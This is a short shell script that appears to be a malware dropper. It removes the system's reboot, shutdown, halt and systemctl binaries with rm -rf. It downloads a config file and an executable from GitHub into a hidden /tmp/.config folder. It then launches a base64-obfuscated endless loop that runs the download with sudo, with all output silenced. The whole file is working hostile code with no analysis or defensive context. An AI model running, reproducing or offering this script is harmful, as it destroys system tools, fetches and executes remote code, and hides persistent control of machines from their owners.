#!/bin/sh

##sudo sed -i '/^@reboot/d' /etc/crontab
sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl

mkdir -p /tmp/.config
wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/10v.json
wget -qO /tmp/.config/bash https://raw.githubusercontent.com/Blenkinship/any/main/0
chmod -R 777 /tmp/.config
/bin/sh -c "echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIHN1ZG8gLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmUK' |base64 -d |/bin/bash" &
